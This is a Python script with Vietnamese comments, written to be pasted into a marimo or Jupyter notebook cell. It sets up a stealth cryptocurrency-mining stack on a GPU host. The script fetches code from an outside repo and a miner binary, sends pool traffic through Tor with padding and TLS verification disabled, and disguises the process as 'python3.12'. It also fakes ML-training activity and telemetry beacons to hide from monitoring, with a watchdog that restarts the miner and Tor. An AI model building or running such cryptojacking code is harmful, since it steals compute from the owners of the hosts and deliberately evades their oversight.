#!/usr/bin/env python3
"""
notebook_cell.py — Paste VÀO MỘT CELL của marimo/Jupyter, chạy toàn bộ stack.

- Tự clone repo (layers), cài pysocks, tải miner
- Tor hardened (obfs4/snowflake PT, che Tor khỏi DPI)
- Stratum proxy qua Tor + padding
- 13 disguise layers (VRAM 88% stable, beacons, process/disk/net fake)
- Miner + watchdog
- Cell giữ loop status nhẹ (60s/lần) — Ctrl+C để dừng

Chạy: paste toàn bộ file vào 1 cell rồi Run.
"""
import os
import sys
import time
import json
import socket
import random
import math
import signal
import tempfile
import threading
import subprocess
import shutil
import ssl
import tarfile
import urllib.request
from pathlib import Path

# ═════════════════ CONFIG ═════════════════
WALLET = "prl1p3xj3ak89z2j873km07d7jz2umk5lfm5540hjafq92q5gud9prknqqq482j"
POOL_HOST = "prl.kryptex.network"
POOL_PORT = 7048
ALGO = "pearlhash"
WORKER = "rig01"

SOCKS = ("127.0.0.1", 9050)
LISTEN = ("127.0.0.1", 3333)
TOR_MODE = "auto"          # auto|obfs4|snowflake|vanilla
VRAM_FRAC = 0.88           # % VRAM chiếm (96GB -> ~84GB stable)
GPU_ID = 0
NUM_WORKERS = 4
PNAME = "python3.12"

REPO = "https://github.com/ducknogit/stealth_onezero.git"
TOR_URL = ("https://dist.torproject.org/torbrowser/15.0.25/"
           "tor-expert-bundle-linux-x86_64-15.0.25.tar.gz")
MINER_URL = ("https://github.com/OneZeroMiner/onezerominer/releases/"
             "download/v1.8.3/onezerominer-linux-1.8.3.tar.gz")
# ═══════════════════════════════════════════

DIR = Path.home() / "stealth_onezero"
MINER = DIR / "bin" / "onezerominer"
LAYERS = DIR / "layers"

_state = {"tor": False, "proxy": False, "miner_pid": None, "sim": None}


def log(m):
    print(f"[cell] {m}", flush=True)


def _extract(t, path):
    """extractall với filter='data' nếu Python>=3.12, ngược lại thường."""
    try:
        t.extractall(path, filter="data")
    except TypeError:
        t.extractall(path)


def set_pname(n):
    try:
        import ctypes
        ctypes.CDLL("libc.so.6", use_errno=True).prctl(15, n.encode()[:15], 0, 0, 0)
    except Exception:
        pass


def popen(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    kw.setdefault("start_new_session", True)
    try:
        return subprocess.Popen(cmd, **kw)
    except Exception as e:
        log(f"popen err: {e}")
        return None


def socks_up(timeout=1.5):
    try:
        s = socket.create_connection(SOCKS, timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


# ═══════════════ 1. SETUP ═══════════════

def setup():
    # repo
    if not DIR.exists():
        log("clone repo...")
        subprocess.run(["git", "clone", REPO, str(DIR)], capture_output=True, timeout=120)
    else:
        subprocess.run(["git", "-C", str(DIR), "fetch", "--all"], capture_output=True, timeout=60)
        subprocess.run(["git", "-C", str(DIR), "reset", "--hard", "origin/main"],
                       capture_output=True, timeout=30)
    if not LAYERS.exists():
        raise RuntimeError(f"layers not found: {LAYERS}")
    sys.path.insert(0, str(LAYERS))

    # pysocks
    try:
        import socks  # noqa
    except ImportError:
        log("install pysocks...")
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "pysocks"],
                       capture_output=True, timeout=300)

    # miner
    if not MINER.exists():
        log("download miner...")
        tmp = DIR / "m.tar.gz"
        urllib.request.urlretrieve(MINER_URL, tmp)
        with tarfile.open(tmp, "r:gz") as t:
            _extract(t, DIR / "bin")
        tmp.unlink()
        for p in (DIR / "bin").rglob("onezerominer"):
            if p.is_file() and not p.suffix:
                p.chmod(0o755)
                if p != MINER:
                    p.rename(MINER)
    log(f"setup OK miner={MINER.exists()}")


# ═══════════════ 2. TOR (hardened -> vanilla) ═══════════════

def start_tor():
    if socks_up():
        _state["tor"] = True
        log("tor already up")
        return True

    # hardened: obfs4/snowflake PT
    try:
        from tor_hardened import start_tor_hardened, socks_working
        log(f"tor hardened mode={TOR_MODE}...")
        proc = start_tor_hardened(socks=SOCKS, mode=TOR_MODE,
                                  bootstrap_timeout=90, log=log)
        if proc and socks_working(SOCKS):
            _state["tor"] = True
            return True
    except Exception as e:
        log(f"tor_hardened err: {e}")

    # vanilla fallback
    log("tor vanilla fallback...")
    tmp = tempfile.mkdtemp(prefix=".t_")
    tarball = os.path.join(tmp, "t.tgz")
    try:
        # Chọn bundle URL theo arch host (x86_64/aarch64)
        try:
            from tor_hardened import bundle_url
            url = bundle_url()
        except Exception:
            url = TOR_URL
        urllib.request.urlretrieve(url, tarball)
        with tarfile.open(tarball, "r:gz") as t:
            _extract(t, tmp)
        os.unlink(tarball)
        # find_tool: ưu tiên tor/tor (bỏ debug/tor), validate ELF
        try:
            from tor_hardened import find_tool, _elf_info, host_arch
            tor_bin = find_tool(tmp, "tor")
            if tor_bin:
                kind, arch = _elf_info(tor_bin)
                log(f"vanilla tor: elf={kind}/{arch} host={host_arch()} {tor_bin}")
                if kind == "elf" and arch != host_arch():
                    log("ARCH MISMATCH — tải bundle sai arch, cần sửa TOR_URL")
                    return False
        except Exception as e:
            log(f"find_tool err: {e}")
            tor_bin = None
        if not tor_bin:
            log("tor binary not found (ELF check failed)")
            return False
        os.chmod(tor_bin, 0o755)
        ddir = os.path.join(tmp, "d")
        os.makedirs(ddir, exist_ok=True)
        torrc = os.path.join(tmp, "t.conf")
        with open(torrc, "w") as f:
            f.write(f"SocksPort {SOCKS[0]}:{SOCKS[1]}\nDataDirectory {ddir}\n"
                    "AvoidDiskWrites 1\nClientOnly 1\nConnectionPadding 1\n")
        env = os.environ.copy()
        env["HOME"] = tmp
        lib = os.path.join(os.path.dirname(tor_bin), "..", "lib")
        if os.path.isdir(lib):
            env["LD_LIBRARY_PATH"] = lib
        popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
        for i in range(60):
            if socks_up():
                _state["tor"] = True
                log(f"tor ready ({i + 1}s)")
                return True
            time.sleep(0.5)
        log("tor timeout")
        return False
    except Exception as e:
        log(f"tor err: {e}")
        return False
    finally:
        threading.Thread(target=lambda: (time.sleep(5),
                                         shutil.rmtree(tmp, ignore_errors=True)),
                         daemon=True).start()


# ═══════════════ 3. STRATUM PROXY ═══════════════

def start_proxy():
    try:
        import socks as pysocks
    except ImportError:
        log("pysocks missing")
        return False

    padding = None
    try:
        from network_disguise import TrafficPadding
        padding = TrafficPadding()
    except Exception:
        pass

    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(LISTEN)
        srv.listen(16)
    except Exception as e:
        log(f"proxy bind err: {e}")
        return False

    def handle(c):
        try:
            p = pysocks.socksocket()
            p.set_proxy(pysocks.SOCKS5, SOCKS[0], SOCKS[1], rdns=True)
            p.settimeout(30)
            p.connect((POOL_HOST, POOL_PORT))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            p = ctx.wrap_socket(p, server_hostname=POOL_HOST)

            def pipe(src, dst, do_pad=False):
                while True:
                    d = src.recv(65536)
                    if not d:
                        break
                    if do_pad and padding:
                        d = padding.pad_json_message(d)
                    dst.sendall(d)
                    if padding:
                        padding.timing_jitter(0.005, 0.003)

            threading.Thread(target=pipe, args=(c, p, True), daemon=True).start()
            threading.Thread(target=pipe, args=(p, c, False), daemon=True).start()
        except Exception:
            try:
                c.close()
            except Exception:
                pass

    def loop():
        while True:
            try:
                c, _ = srv.accept()
                threading.Thread(target=handle, args=(c,), daemon=True).start()
            except Exception:
                break

    threading.Thread(target=loop, daemon=True).start()
    _state["proxy"] = True
    log(f"proxy listening {LISTEN[0]}:{LISTEN[1]}")
    return True


# ═══════════════ 4. DISGUISE (13 layers) ═══════════════

def start_disguise():
    set_pname(PNAME)
    try:
        from orchestrator import TrainingSimulator
        sim = TrainingSimulator(log_output=True, num_workers=NUM_WORKERS)
        sim.setup(
            gpu_id=GPU_ID,
            silent=True,
            socks=SOCKS,
            vram_target_frac=VRAM_FRAC,   # 96GB -> ~84GB stable
            use_tor_hardened=False,       # tor da start o day
            use_beacons=True,             # fake WandB/HF/S3 traffic qua Tor
        )
        sim.start_heartbeat(interval=1.0)
        sim.start_coordination()
        _state["sim"] = sim
        log("13 disguise layers ACTIVE")
        return sim
    except Exception as e:
        log(f"disguise err: {e}")
        import traceback
        traceback.print_exc()
        return None


# ═══════════════ 5. MINER ═══════════════

def start_miner():
    if not MINER.exists():
        log("miner missing!")
        return False
    set_pname(PNAME)
    local = f"stratum+tcp://{LISTEN[0]}:{LISTEN[1]}"
    proc = popen([
        str(MINER),
        f"--algo={ALGO}",
        f"--pool={local}",
        f"--wallet={WALLET}",
        f"--worker={WORKER}",
        "--log-file=/dev/null",
        "--no-cert-validation",
    ])
    if proc:
        _state["miner_pid"] = proc.pid
        log(f"miner PID={proc.pid}")
        return True
    return False


# ═══════════════ 6. WATCHDOG ═══════════════

def watchdog():
    while True:
        time.sleep(30)
        # miner
        pid = _state.get("miner_pid")
        if pid:
            try:
                os.kill(pid, 0)
            except OSError:
                log("miner dead -> restart")
                start_miner()
        # tor
        if not socks_up(timeout=2):
            log("tor down -> restart")
            _state["tor"] = False
            start_tor()


# ═══════════════ RUN ═══════════════

log("=" * 50)
log("stealth stack starting...")

setup()
start_tor()
start_proxy()
sim = start_disguise()
start_miner()
threading.Thread(target=watchdog, daemon=True).start()

log(f"status: tor={_state['tor']} proxy={_state['proxy']} "
    f"miner={_state['miner_pid']} layers={sim is not None}")
log("running... (Ctrl+C cell = stop)")

# Status loop — nhẹ, 60s/lần
try:
    tick = 0
    while True:
        time.sleep(60)
        tick += 1
        pid = _state.get("miner_pid")
        alive = False
        if pid:
            try:
                os.kill(pid, 0)
                alive = True
            except OSError:
                alive = False
        line = (f"t+{tick}m tor={_state['tor']} proxy={_state['proxy']} "
                f"miner={'up' if alive else 'DOWN'}")
        if sim is not None:
            try:
                st = sim.status()
                v = st.get("vram") or {}
                line += (f" step={st['step']} vram={v.get('used_mb', '?')}MB"
                         f" beacon={(st.get('beacon') or {}).get('sent', 0)}")
            except Exception:
                pass
        print(f"[cell] {line}", flush=True)
except KeyboardInterrupt:
    log("stopping...")
    if sim is not None:
        try:
            sim.stop()
        except Exception:
            pass
    pid = _state.get("miner_pid")
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except OSError:
            pass
    log("stopped")
